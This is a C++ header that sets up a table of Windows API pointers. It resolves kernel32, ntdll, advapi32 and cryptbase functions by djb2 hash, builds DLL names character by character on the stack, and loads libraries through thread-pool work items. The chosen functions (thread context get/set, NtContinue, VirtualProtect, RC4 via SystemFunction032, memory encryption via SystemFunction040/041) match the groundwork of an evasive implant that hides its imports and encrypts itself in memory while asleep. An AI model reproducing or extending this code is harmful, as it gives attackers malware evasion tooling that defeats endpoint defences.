/* InitializeAPI.h */
#pragma once

#ifndef INITIALIZEAPI_H
#define INITIALIZEAPI_H

#include <Windows.h>
#include "Primitives.h"
#include "Debug.h"
#include "Structs.h"
#include "Common.h"

namespace Win32API {

    inline BOOL InitializeWin32APIs() {

        PVOID                               Kernel32            = nullptr;
        PVOID                               Ntdll               = nullptr;
        PVOID                               AdvApi              = nullptr;
        PVOID                               CryptBase           = nullptr;
        WCHAR                               AdvStr[]            = { L'a', L'd', L'v', L'a', L'p', L'i', L'3', L'2', L'.', L'd', L'l', L'l', L'\0' };
        WCHAR                               CryptStr[]          = { L'c', L'r', L'y', L'p', L't', L'b', L'a', L's', L'e', L'.', L'd', L'l', L'l', L'\0' };

#ifdef DEBUG
        DBGPRINT("[*] Initializing Win32 APIs \n");
#endif

        if (!(Kernel32 = Resolver::LdrGetModuleByHash(Hash::ExprHashStrDjb2(L"kernel32.dll")))) {
#ifdef DEBUG
            DBGPRINT("[-] LdrGetModuleByHash -> Failed To Get Kernel32 Handle - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
            return FALSE;
        }

        if (!(Ntdll = Resolver::LdrGetModuleByHash(Hash::ExprHashStrDjb2(L"ntdll.dll")))) {
#ifdef DEBUG
            DBGPRINT("[-] LdrGetModuleByHash -> Failed To Get Ntdll Handle - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
            return FALSE;
        }

        g_Win32.K32.LoadLibraryW = (decltype(g_Win32.K32.LoadLibraryW))Resolver::LdrShieldedSymbolResolveByHash(Kernel32, Hash::ExprHashStrDjb2("LoadLibraryW"));
        g_Win32.K32.GetModuleHandleW = (decltype(g_Win32.K32.GetModuleHandleW))Resolver::LdrShieldedSymbolResolveByHash(Kernel32, Hash::ExprHashStrDjb2("GetModuleHandleW"));
        g_Win32.Nt.RtlQueueWorkItem = (decltype(g_Win32.Nt.RtlQueueWorkItem))Resolver::LdrShieldedSymbolResolveByHash(Ntdll, Hash::ExprHashStrDjb2("RtlQueueWorkItem"));

        if (!g_Win32.K32.LoadLibraryW || !g_Win32.K32.GetModuleHandleW || !g_Win32.Nt.RtlQueueWorkItem)
            return FALSE;

        if (!(AdvApi = Proxy::WorkItemLoadLibrary(AdvStr))) {
#ifdef DEBUG
            DBGPRINT("[-] WorkItemLoadLibrary -> Failed To Load AdvApi - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
            return FALSE;
        }

        if (!(CryptBase = Proxy::WorkItemLoadLibrary(CryptStr))) {
#ifdef DEBUG
            DBGPRINT("[-] WorkItemLoadLibrary -> Failed To Load CryptBase - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
            return FALSE;
        }

        /* Initialize Kernel32 Apis */
        g_Win32.K32.WaitForSingleObject = (decltype(g_Win32.K32.WaitForSingleObject))Resolver::LdrShieldedSymbolResolveByHash(Kernel32, Hash::ExprHashStrDjb2("WaitForSingleObject"));
        g_Win32.K32.HeapWalk = (decltype(g_Win32.K32.HeapWalk))Resolver::LdrShieldedSymbolResolveByHash(Kernel32, Hash::ExprHashStrDjb2("HeapWalk"));
        g_Win32.K32.WaitForSingleObjectEx = (decltype(g_Win32.K32.WaitForSingleObjectEx))Resolver::LdrShieldedSymbolResolveByHash(Kernel32, Hash::ExprHashStrDjb2("WaitForSingleObjectEx"));
        g_Win32.K32.VirtualProtect = (decltype(g_Win32.K32.VirtualProtect))Resolver::LdrShieldedSymbolResolveByHash(Kernel32, Hash::ExprHashStrDjb2("VirtualProtect"));
        g_Win32.K32.SetEvent = (decltype(g_Win32.K32.SetEvent))Resolver::LdrShieldedSymbolResolveByHash(Kernel32, Hash::ExprHashStrDjb2("SetEvent"));

        if (!g_Win32.K32.WaitForSingleObject || !g_Win32.K32.HeapWalk || !g_Win32.K32.WaitForSingleObjectEx || !g_Win32.K32.VirtualProtect || !g_Win32.K32.SetEvent)
            return FALSE;


//======================================================================================================================================================================

        /* Initialize Ntdll Apis */
        g_Win32.Nt.NtCreateEvent = (decltype(g_Win32.Nt.NtCreateEvent))Resolver::LdrShieldedSymbolResolveByHash(Ntdll, Hash::ExprHashStrDjb2("NtCreateEvent"));
        g_Win32.Nt.NtQueryInformationProcess = (decltype(g_Win32.Nt.NtQueryInformationProcess))Resolver::LdrShieldedSymbolResolveByHash(Ntdll, Hash::ExprHashStrDjb2("NtQueryInformationProcess"));
        g_Win32.Nt.NtSetEvent = (decltype(g_Win32.Nt.NtSetEvent))Resolver::LdrShieldedSymbolResolveByHash(Ntdll, Hash::ExprHashStrDjb2("NtSetEvent"));
        g_Win32.Nt.NtWaitForSingleObject = (decltype(g_Win32.Nt.NtWaitForSingleObject))Resolver::LdrShieldedSymbolResolveByHash(Ntdll, Hash::ExprHashStrDjb2("NtWaitForSingleObject"));
        g_Win32.Nt.NtSignalAndWaitForSingleObject = (decltype(g_Win32.Nt.NtSignalAndWaitForSingleObject))Resolver::LdrShieldedSymbolResolveByHash(Ntdll, Hash::ExprHashStrDjb2("NtSignalAndWaitForSingleObject"));
        g_Win32.Nt.NtContinue = (decltype(g_Win32.Nt.NtContinue))Resolver::LdrShieldedSymbolResolveByHash(Ntdll, Hash::ExprHashStrDjb2("NtContinue"));
        g_Win32.Nt.NtOpenThread = (decltype(g_Win32.Nt.NtOpenThread))Resolver::LdrShieldedSymbolResolveByHash(Ntdll, Hash::ExprHashStrDjb2("NtOpenThread"));
        g_Win32.Nt.NtQuerySystemInformation = (decltype(g_Win32.Nt.NtQuerySystemInformation))Resolver::LdrShieldedSymbolResolveByHash(Ntdll, Hash::ExprHashStrDjb2("NtQuerySystemInformation"));
        g_Win32.Nt.NtResumeThread = (decltype(g_Win32.Nt.NtResumeThread))Resolver::LdrShieldedSymbolResolveByHash(Ntdll, Hash::ExprHashStrDjb2("NtResumeThread"));
        g_Win32.Nt.NtSuspendThread = (decltype(g_Win32.Nt.NtSuspendThread))Resolver::LdrShieldedSymbolResolveByHash(Ntdll, Hash::ExprHashStrDjb2("NtSuspendThread"));
        g_Win32.Nt.NtGetContextThread = (decltype(g_Win32.Nt.NtGetContextThread))Resolver::LdrShieldedSymbolResolveByHash(Ntdll, Hash::ExprHashStrDjb2("NtGetContextThread"));
        g_Win32.Nt.NtSetContextThread = (decltype(g_Win32.Nt.NtSetContextThread))Resolver::LdrShieldedSymbolResolveByHash(Ntdll, Hash::ExprHashStrDjb2("NtSetContextThread"));
        g_Win32.Nt.NtDuplicateObject = (decltype(g_Win32.Nt.NtDuplicateObject))Resolver::LdrShieldedSymbolResolveByHash(Ntdll, Hash::ExprHashStrDjb2("NtDuplicateObject"));
        g_Win32.Nt.RtlAcquireSRWLockExclusive = (decltype(g_Win32.Nt.RtlAcquireSRWLockExclusive))Resolver::LdrShieldedSymbolResolveByHash(Ntdll, Hash::ExprHashStrDjb2("RtlAcquireSRWLockExclusive"));
        g_Win32.Nt.RtlAddFunctionTable = (decltype(g_Win32.Nt.RtlAddFunctionTable))Resolver::LdrShieldedSymbolResolveByHash(Ntdll, Hash::ExprHashStrDjb2("RtlAddFunctionTable"));
        g_Win32.Nt.RtlCaptureContext = (decltype(g_Win32.Nt.RtlCaptureContext))Resolver::LdrShieldedSymbolResolveByHash(Ntdll, Hash::ExprHashStrDjb2("RtlCaptureContext"));
        g_Win32.Nt.RtlDeleteFunctionTable = (decltype(g_Win32.Nt.RtlDeleteFunctionTable))Resolver::LdrShieldedSymbolResolveByHash(Ntdll, Hash::ExprHashStrDjb2("RtlDeleteFunctionTable"));
        g_Win32.Nt.RtlRegisterWait = (decltype(g_Win32.Nt.RtlRegisterWait))Resolver::LdrShieldedSymbolResolveByHash(Ntdll, Hash::ExprHashStrDjb2("RtlRegisterWait"));
        g_Win32.Nt.RtlLookupFunctionEntry = (decltype(g_Win32.Nt.RtlLookupFunctionEntry))Resolver::LdrShieldedSymbolResolveByHash(Ntdll, Hash::ExprHashStrDjb2("RtlLookupFunctionEntry"));
        g_Win32.Nt.RtlReleaseSRWLockExclusive = (decltype(g_Win32.Nt.RtlReleaseSRWLockExclusive))Resolver::LdrShieldedSymbolResolveByHash(Ntdll, Hash::ExprHashStrDjb2("RtlReleaseSRWLockExclusive"));
        g_Win32.Nt.RtlVirtualUnwind = (decltype(g_Win32.Nt.RtlVirtualUnwind))Resolver::LdrShieldedSymbolResolveByHash(Ntdll, Hash::ExprHashStrDjb2("RtlVirtualUnwind"));

        if (!g_Win32.Nt.NtCreateEvent || !g_Win32.Nt.NtQueryInformationProcess ||
            !g_Win32.Nt.NtSetEvent || !g_Win32.Nt.RtlAcquireSRWLockExclusive ||
            !g_Win32.Nt.RtlAddFunctionTable || !g_Win32.Nt.RtlDeleteFunctionTable ||
            !g_Win32.Nt.RtlLookupFunctionEntry || !g_Win32.Nt.RtlReleaseSRWLockExclusive ||
            !g_Win32.Nt.RtlVirtualUnwind || !g_Win32.Nt.NtWaitForSingleObject || !g_Win32.Nt.NtSignalAndWaitForSingleObject ||
            !g_Win32.Nt.NtContinue || !g_Win32.Nt.NtOpenThread || !g_Win32.Nt.NtResumeThread || !g_Win32.Nt.NtQuerySystemInformation ||
            !g_Win32.Nt.NtSuspendThread || !g_Win32.Nt.RtlCaptureContext || !g_Win32.Nt.RtlRegisterWait ||
            !g_Win32.Nt.NtGetContextThread || !g_Win32.Nt.NtSetContextThread || !g_Win32.Nt.NtDuplicateObject)
            return FALSE;

//======================================================================================================================================================================

        /* Initialize AdvApi32 Apis */
        g_Win32.AdvApi32.RegCloseKey = (decltype(g_Win32.AdvApi32.RegCloseKey))Resolver::LdrShieldedSymbolResolveByHash(AdvApi, Hash::ExprHashStrDjb2("RegCloseKey"));
        g_Win32.AdvApi32.RegOpenKeyExW = (decltype(g_Win32.AdvApi32.RegOpenKeyExW))Resolver::LdrShieldedSymbolResolveByHash(AdvApi, Hash::ExprHashStrDjb2("RegOpenKeyExW"));
        g_Win32.AdvApi32.RegQueryValueExW = (decltype(g_Win32.AdvApi32.RegQueryValueExW))Resolver::LdrShieldedSymbolResolveByHash(AdvApi, Hash::ExprHashStrDjb2("RegQueryValueExW"));
        g_Win32.AdvApi32.SystemFunction032 = (decltype(g_Win32.AdvApi32.SystemFunction032))Resolver::LdrShieldedSymbolResolveByHash(AdvApi, Hash::ExprHashStrDjb2("SystemFunction032"));

        if (!g_Win32.AdvApi32.RegCloseKey || !g_Win32.AdvApi32.RegOpenKeyExW || !g_Win32.AdvApi32.RegQueryValueExW || !g_Win32.AdvApi32.SystemFunction032)
            return FALSE;

//======================================================================================================================================================================
        
        /* Initialize CryptBase Apis */
        g_Win32.CryptBase.SystemFunction040 = (decltype(g_Win32.CryptBase.SystemFunction040))Resolver::LdrShieldedSymbolResolveByHash(CryptBase, Hash::ExprHashStrDjb2("SystemFunction040"));
        g_Win32.CryptBase.SystemFunction041 = (decltype(g_Win32.CryptBase.SystemFunction041))Resolver::LdrShieldedSymbolResolveByHash(CryptBase, Hash::ExprHashStrDjb2("SystemFunction041"));

        if (!g_Win32.CryptBase.SystemFunction040 || !g_Win32.CryptBase.SystemFunction041)
            return FALSE;

#ifdef DEBUG
        DBGPRINT("[+] Success \n");
#endif
        return TRUE;
    }
}

#endif
